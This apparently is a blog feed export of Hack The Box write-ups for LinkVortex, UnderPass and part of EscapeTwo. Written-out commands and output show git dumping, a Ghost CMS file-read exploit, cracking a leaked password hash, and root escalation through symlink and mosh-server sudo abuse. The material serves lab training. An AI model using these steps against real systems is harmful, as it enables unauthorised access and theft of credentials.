<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  dirsearch -u dev.linkvortex.htb</span><br><span class="line">/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html</span><br><span class="line">  from pkg_resources import DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460</span><br><span class="line"></span><br><span class="line">Output File: /home/kali/reports/_dev.linkvortex.htb/_24-12-27_07-25-41.txt</span><br><span class="line"></span><br><span class="line">Target: http://dev.linkvortex.htb/</span><br><span class="line"></span><br><span class="line"> [07:25:41] Starting:                                                                                                                              </span><br><span class="line"> [07:25:43] 200 -   73B  - /.git/description                                 </span><br><span class="line"> [07:25:43] 200 -  201B  - /.git/config                                      </span><br><span class="line"> [07:25:43] 200 -  620B  - /.git/hooks/</span><br><span class="line"> [07:25:43] 200 -  557B  - /.git/                                            </span><br><span class="line"> [07:25:43] 200 -   41B  - /.git/HEAD</span><br><span class="line"> [07:25:43] 301 -  239B  - /.git  -&gt;  http://dev.linkvortex.htb/.git/        </span><br><span class="line"> [07:25:43] 200 -  402B  - /.git/info/                                       </span><br><span class="line"> [07:25:43] 200 -  401B  - /.git/logs/</span><br><span class="line"> [07:25:43] 200 -  175B  - /.git/logs/HEAD                                   </span><br><span class="line"> [07:25:43] 200 -  240B  - /.git/info/exclude                                </span><br><span class="line"> [07:25:44] 200 -  393B  - /.git/refs/                                       </span><br><span class="line"> [07:25:44] 200 -  418B  - /.git/objects/</span><br><span class="line"> [07:25:44] 200 -  147B  - /.git/packed-refs                                 </span><br><span class="line"> [07:25:44] 301 -  249B  - /.git/refs/tags  -&gt;  http://dev.linkvortex.htb/.git/refs/tags/</span><br><span class="line"> [07:25:44] 200 -  691KB - /.git/index                                       </span><br><span class="line"> [07:25:44] 403 -  199B  - /.ht_wsr.txt                                      </span><br><span class="line"> [07:25:44] 403 -  199B  - /.htaccess.bak1                                   </span><br><span class="line"> [07:25:44] 403 -  199B  - /.htaccess.orig                                   </span><br><span class="line"> [07:25:44] 403 -  199B  - /.htaccess.sample                                 </span><br><span class="line"> [07:25:44] 403 -  199B  - /.htaccess_extra                                  </span><br><span class="line"> [07:25:44] 403 -  199B  - /.htaccessBAK</span><br><span class="line"> [07:25:44] 403 -  199B  - /.htaccessOLD2</span><br><span class="line"> [07:25:44] 403 -  199B  - /.htaccess.save                                   </span><br><span class="line"> [07:25:44] 403 -  199B  - /.htm</span><br><span class="line"> [07:25:44] 403 -  199B  - /.htaccess_sc</span><br><span class="line"> [07:25:44] 403 -  199B  - /.htaccess_orig</span><br><span class="line"> [07:25:44] 403 -  199B  - /.htaccessOLD                                     </span><br><span class="line"> [07:25:44] 403 -  199B  - /.html</span><br><span class="line"> [07:25:44] 403 -  199B  - /.htpasswd_test                                   </span><br><span class="line"> [07:25:44] 403 -  199B  - /.htpasswds                                       </span><br><span class="line"> [07:25:44] 403 -  199B  - /.httr-oauth</span><br><span class="line"> [07:26:03] 403 -  199B  - /cgi-bin/                                         </span><br><span class="line"> [07:26:30] 403 -  199B  - /server-status/                                   </span><br><span class="line"> [07:26:30] 403 -  199B  - /server-status                                    </span><br><span class="line"> Task Completed</span><br></pre></td></tr></table></figure>
<p>The presence of the .git directory suggests potential sensitive information.<br> We use GitHack to extract its contents:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python Githack.py http://dev.linkvortex.htb/.git/</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
<p>The extracted files include authentication.test.js, which contains hardcoded<br>credentials:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">const password = <span class="string">&#x27;OctopiFociPilfer45&#x27;</span>;</span><br></pre></td></tr></table></figure>
<h2 id="Step-5-Exploiting-the-Login-Page"><a href="#Step-5-Exploiting-the-Login-Page" class="headerlink" title="Step 5: Exploiting the Login Page"></a>Step 5: Exploiting the Login Page</h2><p>We use the credentials to log in to &#x2F;ghost&#x2F;:</p>
<ul>
  <li><strong>Username</strong>: admin@linkvortex.htb</li>
  <li><strong>Password</strong>: OctopiFociPilfer45</li>
</ul>


<p>After logging in, we find the machine is running a vulnerable version of Ghost CMS.<br>We exploit CVE-2023-40028 to read arbitrary files:<br>BTW: after downloading the CVE change the URL from the host the </p>
<p> http://linkvortex.htb </p>
 read the config file that we found in dockerfile.ghost

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ bash CVE-2023-40028 -u admin@linkvortex.htb -p OctopiFociPilfer45</span><br><span class="line"> WELCOME TO THE CVE-2023-40028 SHELL</span><br><span class="line"> file&gt; /var/lib/ghost/config.production.json</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>The exploit reveals the following:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;url&quot;</span>: <span class="string">&quot;http://localhost:2368&quot;</span>,</span><br><span class="line"><span class="string">&quot;server&quot;</span>: &#123;</span><br><span class="line">  <span class="string">&quot;port&quot;</span>: 2368,</span><br><span class="line">  <span class="string">&quot;host&quot;</span>: <span class="string">&quot;::&quot;</span></span><br><span class="line">&#125;,&#123;</span><br><span class="line"><span class="string">&quot;mail&quot;</span>: &#123;</span><br><span class="line">  <span class="string">&quot;transport&quot;</span>: <span class="string">&quot;Direct&quot;</span></span><br><span class="line">&#125;,&#123;</span><br><span class="line"><span class="string">&quot;logging&quot;</span>: &#123;</span><br><span class="line">  <span class="string">&quot;transports&quot;</span>: [<span class="string">&quot;stdout&quot;</span>]</span><br><span class="line">&#125;,&#123;</span><br><span class="line"><span class="string">&quot;process&quot;</span>: <span class="string">&quot;systemd&quot;</span>,</span><br><span class="line"><span class="string">&quot;paths&quot;</span>: &#123;</span><br><span class="line">  <span class="string">&quot;contentPath&quot;</span>: <span class="string">&quot;/var/lib/ghost/content&quot;</span></span><br><span class="line">&#125;,&#123;</span><br><span class="line"><span class="string">&quot;spam&quot;</span>: &#123;</span><br><span class="line">  <span class="string">&quot;user_login&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;minWait&quot;</span>: 1,</span><br><span class="line">      <span class="string">&quot;maxWait&quot;</span>: 604800000,</span><br><span class="line">      <span class="string">&quot;freeRetries&quot;</span>: 5000</span><br><span class="line">  &#125;,&#123;</span><br><span class="line"><span class="string">&quot;mail&quot;</span>: &#123;</span><br><span class="line">   <span class="string">&quot;transport&quot;</span>: <span class="string">&quot;SMTP&quot;</span>,</span><br><span class="line">   <span class="string">&quot;options&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;service&quot;</span>: <span class="string">&quot;Google&quot;</span>,</span><br><span class="line">    <span class="string">&quot;host&quot;</span>: <span class="string">&quot;linkvortex.htb&quot;</span>,</span><br><span class="line">    <span class="string">&quot;port&quot;</span>: 587,</span><br><span class="line">    <span class="string">&quot;auth&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;user&quot;</span>: <span class="string">&quot;bob@linkvortex.htb&quot;</span>,</span><br><span class="line">      <span class="string">&quot;pass&quot;</span>: <span class="string">&quot;fibber-talented-worth&quot;</span></span><br><span class="line">      </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>Finally i try soo many time to get that i thought the CVE isnt working but idk somehow it works<br>so we got the password and the username.<br>Using the credentials:</p>
<ul>
  <li><strong>Username</strong>: bob@linkvortex.htb</li>
  <li><strong>Password</strong>: fibber-talented-worth</li>
</ul>


<h2 id="Step-6-SSH-Access"><a href="#Step-6-SSH-Access" class="headerlink" title="Step 6: SSH Access"></a>Step 6: SSH Access</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh bob@linkvortex.htb</span><br><span class="line"> <span class="comment"># bob@linkvortex.htb&#x27;s password: fibber-talented-worth</span></span><br><span class="line"></span><br><span class="line">$ bob@linkvortex:~$ <span class="built_in">cat</span> user.txt</span><br><span class="line">a6acafe1314c70.... <span class="comment"># u can do it </span></span><br></pre></td></tr></table></figure>

<h2 id="Step-7-Privilege-Escalation"><a href="#Step-7-Privilege-Escalation" class="headerlink" title="Step 7: Privilege Escalation"></a>Step 7: Privilege Escalation</h2><p>We check Bob’s sudo privileges:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ bob@linkvortex:~$ <span class="built_in">sudo</span> -l </span><br><span class="line"> Matching Defaults entries <span class="keyword">for</span> bob on linkvortex:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty,</span><br><span class="line">    env_keep+=CHECK_CONTENT</span><br><span class="line"></span><br><span class="line"> User bob may run the following commands on linkvortex:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png</span><br></pre></td></tr></table></figure>
<p>after reading the code of the clean_symlink.sh , The script allows us to use symbolic links to read files.<br> We exploit it to read &#x2F;root&#x2F;root.txt:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bob@linkvortex:~$ <span class="built_in">ln</span> -s /root/root.txt nutzh.txt <span class="comment">#so we create a link between nutzh and root.txt</span></span><br><span class="line">bob@linkvortex:~$ <span class="built_in">ln</span> -s /home/bob/nutzh.txt bob.png <span class="comment"># look the clean_symlink code he can read through the image files</span></span><br><span class="line">bob@linkvortex:~$ <span class="built_in">sudo</span> CHECK_CONTENT=<span class="literal">true</span> /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/bob.png</span><br><span class="line"> Link found [ /home/bob/bob.png ] , moving it to quarantine</span><br><span class="line"> Content:</span><br><span class="line"> c2f05024dc11bbd7dad.... <span class="comment">#u got this mate</span></span><br></pre></td></tr></table></figure>
<p> CONCLUSION : </p>
<p>Key Takeaways:</p>
<p>Use enumeration tools like Dirsearch, FFUF, and GitHack to uncover hidden resources.</p>
<p>Exploit known vulnerabilities (e.g., CVE-2023-40028) for information disclosure.</p>
<p>Understand symlink exploitation to escalate privileges.</p>
<pre><code> Congratulations! You&#39;ve rooted the Linkvortex machine. 🎉
</code></pre>
<div style="margin-top: 20px;">
  <button id="likeButton" onclick="incrementLikes()" style="background-color: #4CAF50; color: white; border: none; padding: 10px 20px; text-align: center; text-decoration: none; display: inline-block; font-size: 16px; margin: 4px 2px; cursor: pointer; border-radius: 12px;">Like</button>
    <span id="likeCount" style="font-size: 16px;">0</span> 👍  I HOPE U LIKE THIS WRITE-UP
</div>

<script>
  let likeCount = 0;
  function incrementLikes() {
    likeCount++;
    document.getElementById('likeCount').innerText = likeCount;
    document.getElementById('likeButton').disabled = true;
    document.getElementById('likeButton').innerText = 'Liked';
    document.getElementById('likeButton').style.backgroundColor = '#888';
  }
</script>

]]></content>
      <categories>
        <category>ACTIVE MACHINE</category>
      </categories>
      <tags>
        <tag>HACK THE BOX</tag>
        <tag>CTF</tag>
        <tag>PENETRATION TESTING</tag>
        <tag>LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>UnderPass</title>
    <url>/Underpass/</url>
    <content><![CDATA[<p>Hello, today we gonna try to hack the Underpass machine  on hackthebox<br>the first thing is enumerate and see if there is an open port on the target<br>machine for that we gonna use the tool nmap </p>
<p>i tried to scan the machine in the first but i found just the port 80 and<br>22 so i tried with to scan UDP ports.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nmap  -sU 10.10.11.48 -T5</span><br><span class="line">  Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-22 12:50 CST</span><br><span class="line">  Warning: 10.10.11.48 giving up on port because retransmission <span class="built_in">cap</span> hit (2).</span><br><span class="line">  Nmap scan report <span class="keyword">for</span> underpass.htb (10.10.11.48)</span><br><span class="line">  Host is up (0.073s latency).</span><br><span class="line">  Not shown: 897 open|filtered udp ports (no-response), 102 closed udp ports (port-unreach)</span><br><span class="line">  PORT    STATE SERVICE</span><br><span class="line">  161/udp open  snmp</span><br><span class="line"> </span><br><span class="line"> Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 100.11 seconds</span><br></pre></td></tr></table></figure>
<p>we find  SNMP port open and SNMP stands for service network management<br>protocol , that port is used monitor and manage the network devices<br>connected over an IP we gonna use now snmp-check tool that helps us<br>to enumerate the SNMP devices </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ snmp-check 10.10.11.48</span><br><span class="line"> snmp-check v1.9 - SNMP enumerator</span><br><span class="line"> Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)</span><br><span class="line"></span><br><span class="line"> [+] Try to connect to 10.10.11.48:161 using SNMPv1 and community <span class="string">&#x27;public&#x27;</span></span><br><span class="line"></span><br><span class="line"> [*] System information:</span><br><span class="line"></span><br><span class="line">  Host IP address               : 10.10.11.48</span><br><span class="line">  Hostname                      : UnDerPass.htb is the only daloradius server <span class="keyword">in</span> the basin!</span><br><span class="line">  Description                   : Linux underpass 5.15.0-126-generic <span class="comment">#136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64</span></span><br><span class="line">  Contact                       : steve@underpass.htb</span><br><span class="line">  Location                      : Nevada, U.S.A. but not Vegas</span><br><span class="line">  Uptime snmp                   : 00:49:46.89</span><br><span class="line">  Uptime system                 : 00:49:36.98</span><br><span class="line">  System <span class="built_in">date</span>                   : 2024-12-25 19:21:21.0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>interesting, we find a user:steve and the name of Host Underpass.htb<br>daloradius HMMM , lets look for it </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ dirsearch -u http://Underpass.htb/daloradius/</span><br><span class="line"></span><br><span class="line">/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html</span><br><span class="line">  from pkg_resources import DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460</span><br><span class="line"></span><br><span class="line">Output File: /home/kali/reports/http_Underpass.htb/_daloradius_24-12-25_14-24-00.txt</span><br><span class="line"></span><br><span class="line">Target: http://Underpass.htb/</span><br><span class="line"></span><br><span class="line">[14:24:00] Starting: daloradius/                                                                                                                  </span><br><span class="line">[14:24:05] 200 -  221B  - /daloradius/.gitignore                            </span><br><span class="line">[14:24:29] 301 -  323B  - /daloradius/app  -&gt;  http://underpass.htb/daloradius/app/</span><br><span class="line">[14:24:35] 200 -   24KB - /daloradius/ChangeLog                             </span><br><span class="line">[14:24:41] 301 -  323B  - /daloradius/doc  -&gt;  http://underpass.htb/daloradius/doc/</span><br><span class="line">[14:24:41] 200 -    2KB - /daloradius/docker-compose.yml                    </span><br><span class="line">[14:24:41] 200 -    2KB - /daloradius/Dockerfile</span><br><span class="line">[14:24:55] 301 -  327B  - /daloradius/library  -&gt;  http://underpass.htb/daloradius/library/</span><br><span class="line">[14:24:55] 200 -   18KB - /daloradius/LICENSE                               </span><br><span class="line">[14:25:11] 200 -   10KB - /daloradius/README.md                             </span><br><span class="line">[14:25:15] 301 -  325B  - /daloradius/setup  -&gt;  http://underpass.htb/daloradius/setup/</span><br><span class="line">                                                                             </span><br><span class="line">Task Completed </span><br></pre></td></tr></table></figure>
<p>try to look for all these files and find something , lets brute force<br>the directories </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ dirsearch -u http://Underpass.htb/daloradius/app </span><br><span class="line"> /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html</span><br><span class="line">  from pkg_resources import DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                  </span><br><span class="line"> (_||| _) (/_(_|| (_| )                                                                                                                           </span><br><span class="line">                                                                                                                                                  </span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460</span><br><span class="line"></span><br><span class="line">Output File: /home/kali/reports/http_Underpass.htb/_daloradius_app_24-12-25_14-33-44.txt</span><br><span class="line"></span><br><span class="line">Target: http://Underpass.htb/</span><br><span class="line"></span><br><span class="line">[14:33:44] Starting: daloradius/app/                                                                                                              </span><br><span class="line">[14:34:20] 301 -  330B  - /daloradius/app/common  -&gt;  http://underpass.htb/daloradius/app/common/</span><br><span class="line">[14:35:11] 301 -  329B  - /daloradius/app/users  -&gt;  http://underpass.htb/daloradius/app/users/</span><br><span class="line">[14:35:11] 302 -    0B  - /daloradius/app/users/  -&gt;  home-main.php         </span><br><span class="line">[14:35:11] 200 -    2KB - /daloradius/app/users/login.php </span><br></pre></td></tr></table></figure>
<p>WOOW , we find a login page Great , but we need Username lets brute force<br>directories more like &#x2F;doc so i brute forced till i found </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ [14:42:06] Starting: daloradius/doc/install/                                                                                                      </span><br><span class="line">  [14:42:55] 200 -    8KB - /daloradius/doc/install/INSTALL                   </span><br><span class="line">                                                                             </span><br><span class="line">  Task Completed</span><br></pre></td></tr></table></figure>
<p>after reading this file i we found the Username and the Password </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">5. INSTALLATION COMPLETE</span><br><span class="line"> ------------------------</span><br><span class="line">            Surf to http://yourip/daloradius</span><br><span class="line">            Login:</span><br><span class="line">          username: administrator</span><br><span class="line">          password: radius</span><br></pre></td></tr></table></figure>
<p>so i tried this administrator:radius and it failed so lets try to brute force<br>the &#x2F;app directory more and hope for something</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  dirsearch -u http://Underpass.htb/daloradius/app/ -w SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt </span><br><span class="line">  /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/   pkg_resources.html</span><br><span class="line">  from pkg_resources import DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line"> Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 220544</span><br><span class="line"></span><br><span class="line">  Output File: /home/kali/reports/http_Underpass.htb/_daloradius_app__24-12-25_14-54-26.txt</span><br><span class="line"></span><br><span class="line"> Target: http://Underpass.htb/</span><br><span class="line"></span><br><span class="line"> [14:54:26] Starting: daloradius/app/</span><br><span class="line"> [14:54:27] 301 -  330B  - /daloradius/app/common  -&gt;  http://underpass.htb/daloradius/app/common/</span><br><span class="line"> [14:54:27] 301 -  329B  - /daloradius/app/users  -&gt;  http://underpass.htb/daloradius/app/users/</span><br><span class="line"> [14:55:10] 301 -  333B  - /daloradius/app/operators  -&gt;  http://underpass.htb/daloradius/app/operators/</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>i went to &#x2F;app&#x2F;operators and i tried to access it with the last<br>Username:Password we had and its works we went to management and<br>list users and we find a hashed password so lets try to decode it<br>with crackstation or u can use john the ripper.<br>(type:MD5) 412DD4759978ACFCC81DEAB01B382403:underwaterfriends and lets try<br>to ssh with the username:password we got (btw : the username is svcMosh) </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh svcMosh@10.10.11.48</span><br><span class="line"><span class="comment"># and enter the password : underwaterfriends</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>IT WORKS, now we are inside the target machine<br>so u can read the user.flag </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">svcMosh@underpass:~$ <span class="built_in">cat</span> user.txt</span><br><span class="line">60a620dd37a894c9b.... <span class="comment"># U got this mate </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">svcMosh@underpass:~$ <span class="built_in">sudo</span> -l</span><br><span class="line"> Matching Defaults entries <span class="keyword">for</span> svcMosh on localhost:</span><br><span class="line">   env_reset, mail_badpass,</span><br><span class="line">   secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty</span><br><span class="line"></span><br><span class="line"> User svcMosh may run the following commands on localhost:</span><br><span class="line">   (ALL) NOPASSWD: /usr/bin/mosh-server</span><br></pre></td></tr></table></figure>
<p>after some searching on google or u can read its manual </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">svcMosh@underpass:~<span class="variable">$mosh</span></span><br><span class="line">Usage: /usr/bin/mosh [options] [--] [user@]host [<span class="built_in">command</span>...]</span><br><span class="line">      --client=PATH        mosh client on <span class="built_in">local</span> machine</span><br><span class="line">                              (default: <span class="string">&quot;mosh-client&quot;</span>)</span><br><span class="line">      --server=COMMAND     mosh server on remote machine <span class="comment"># interesting </span></span><br><span class="line">                              (default: <span class="string">&quot;mosh-server&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>And we are the root , we can read the root file and get this done </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">svcMosh@underpass:~$ mosh --server=<span class="string">&quot;sudo /usr/bin/mosh-server&quot;</span> localhost</span><br><span class="line"></span><br><span class="line">root@underpass:~# <span class="built_in">cat</span> /root/root.txt <span class="comment">#we are the root </span></span><br><span class="line"> 882f2654c3c9... <span class="comment">#try to find it </span></span><br></pre></td></tr></table></figure>

<pre><code>                          CONGRATULATION 
</code></pre>
<p>Summary :</p>
<p>for me , its my first time scanning UDP ports , and enumerate SNMP  so it was<br>a good experience. we learn that we need to brute force some directories<br>more and more until we find something that lead us to the target .<br>Also for the Privesca , it was good to learn about “mosh” command<br>and what used for and a Misconfiguration can lead to a root privileges.</p>
]]></content>
      <categories>
        <category>ACTIVE MACHINE</category>
        <category>HACK THE BOX</category>
        <category>LINUX</category>
      </categories>
  </entry>
  <entry>
    <title>EscapeTwo</title>
    <url>/EscapeTwo/</url>
    <content><![CDATA[<h2 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h2><ol>
<li><a href="#initial-enumeration-with-nmap">Initial Enumeration with Nmap</a></li>
<li><a href="#step-2-Enumeration-services">Step 2: Enumeration services</a></li>
<li><a href="#step-3-foothhold">Step 3: foothhold </a></li>
<li><a href="#step-4privilege-escalation">Step 4: Privilege Escalation</a></li>
</ol>
<p>In this write-up, we will walk through the steps to compromise the Cicada machine on Hack The Box. The machine involves exploiting a Windows Active Directory environment with multiple services running, including SMB, LDAP, and Microsoft SQL Server. We will leverage misconfigurations, weak credentials, and privilege escalation techniques to gain administrative access and retrieve the root flag.</p>
<h2 id="Initial-Enumeration-with-Nmap"><a href="#Initial-Enumeration-with-Nmap" class="headerlink" title="Initial Enumeration with Nmap"></a>Initial Enumeration with Nmap</h2><p>We started by performing a port scan using Nmap to identify open ports and services running on the target machine.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nmap -sV 10.10.11.51 </span><br><span class="line">nmap -sV 10.10.11.51                                                                           </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-12 16:43 +01</span><br><span class="line">Nmap scan report <span class="keyword">for</span> sequel.htb (10.10.11.51)</span><br><span class="line">Host is up (0.066s latency).</span><br><span class="line">Not shown: 988 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server <span class="keyword">time</span>: 2025-01-12 15:44:14Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 56.92 seconds</span><br></pre></td></tr></table></figure>
<h2 id="Key-Findings"><a href="#Key-Findings" class="headerlink" title="Key Findings:"></a>Key Findings:</h2><ul>
<li><p><strong>SMB (Port 445)</strong></p>
<ul>
<li>Potentially exploitable for file shares</li>
</ul>
</li>
<li><p><strong>LDAP (Ports 389, 636)</strong> </p>
<ul>
<li>Active Directory services running</li>
</ul>
</li>
<li><p><strong>MSSQL (Port 1433)</strong></p>
<ul>
<li>Microsoft SQL Server</li>
<li>Potential vector for exploitation</li>
</ul>
</li>
<li><p><strong>Initial Credentials</strong></p>
<ul>
<li>Username: rose </li>
<li>Password: KxEPkKe6R8su</li>
</ul>
</li>
</ul>
<h2 id="Enumeration-services"><a href="#Enumeration-services" class="headerlink" title="Enumeration services"></a>Enumeration services</h2><h3 id="Bloodhound"><a href="#Bloodhound" class="headerlink" title="Bloodhound"></a>Bloodhound</h3><p>Using <span style="color:red; font-size:medium;">Bloodhound</span>, we enumerated the Active Directory environment to identify potential attack paths.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec ldap sequel.htb -u rose  -p KxEPkKe6R8su  --bloodhound --collection All --dns-server 10.10.11.51</span><br><span class="line">SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)</span><br><span class="line">LDAP        10.10.11.51     389    DC01             [+] sequel.htb\rose:KxEPkKe6R8su </span><br><span class="line">LDAP        10.10.11.51     389    DC01             Resolved collection methods: localadmin, trusts, objectprops, container, psremote, group, dcom, acl, rdp, session</span><br><span class="line">LDAP        10.10.11.51     389    DC01             Done <span class="keyword">in</span> 00M 10S</span><br><span class="line">LDAP        10.10.11.51     389    DC01             Compressing output into /home/kali/.nxc/logs/DC01_10.10.11.51_2025-01-12_164518_bloodhound.zip</span><br></pre></td></tr></table></figure>
<p>This generated a <span style="color:red; font-size:medium;">Bloodhound</span> ZIP file, which we analyzed in the <span style="color:red; font-size:medium;">Bloodhound</span> GUI.</p>
<h3 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h3><p>We used netexec to enumerate SMB shares and discovered a share named Accounting Department.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ netexec smb sequel.htb -u rose  -p KxEPkKe6R8su  --shares                      </span><br><span class="line">SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.51     445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su </span><br><span class="line">SMB         10.10.11.51     445    DC01             [*] Enumerated shares</span><br><span class="line">SMB         10.10.11.51     445    DC01             Share           Permissions     Remark</span><br><span class="line">SMB         10.10.11.51     445    DC01             -----           -----------     ------</span><br><span class="line">SMB         10.10.11.51     445    DC01             Accounting Department READ            </span><br><span class="line">SMB         10.10.11.51     445    DC01             ADMIN$                          Remote Admin</span><br><span class="line">SMB         10.10.11.51     445    DC01             C$                              Default share</span><br><span class="line">SMB         10.10.11.51     445    DC01             IPC$            READ            Remote IPC</span><br><span class="line">SMB         10.10.11.51     445    DC01             NETLOGON        READ            Logon server share </span><br><span class="line">SMB         10.10.11.51     445    DC01             SYSVOL          READ            Logon server share </span><br><span class="line">SMB         10.10.11.51     445    DC01             Users           READ </span><br></pre></td></tr></table></figure>
<p>we got the Accounting Department share</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient -U sequel.htb/rose%KxEPkKe6R8su //10.10.11.51/<span class="string">&#x27;Accounting Department&#x27;</span></span><br><span class="line">Try <span class="string">&quot;help&quot;</span> to get a list of possible commands.</span><br><span class="line">smb: \&gt; <span class="built_in">ls</span></span><br><span class="line">  .                                   D        0  Sun Jun  9 11:52:21 2024</span><br><span class="line">  ..                                  D        0  Sun Jun  9 11:52:21 2024</span><br><span class="line">  accounting_2024.xlsx                A    10217  Sun Jun  9 11:14:49 2024</span><br><span class="line">  accounts.xlsx                       A     6780  Sun Jun  9 11:52:07 2024</span><br></pre></td></tr></table></figure>
<p>We accessed the Accounting Department share and found two Excel files:</p>
<ul>
<li><code>accounting_2024.xlsx</code></li>
<li><code>accounts.xlsx</code></li>
</ul>
<p>After analyzing these files, we extracted the following credentials:</p>
<ul>
